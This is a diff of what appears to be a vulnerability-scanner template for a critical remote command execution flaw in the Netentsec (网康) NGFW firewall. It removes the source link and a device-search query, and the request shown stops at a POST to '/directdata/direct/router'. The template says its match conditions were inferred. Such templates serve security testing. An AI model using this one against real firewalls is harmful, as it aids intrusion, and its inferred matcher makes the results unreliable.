@@ -3,14 +3,8 @@ info:
   name: 网康下一代防火墙远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f1d9681292462a48ae78b9b5916dacac
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: f1d9681292462a48ae78b9b5916dacac
-    fofa: + hunter`app.name="网康 NGFW"`
 http:
 - raw:
   - 'POST /directdata/direct/router HTTP/1.1
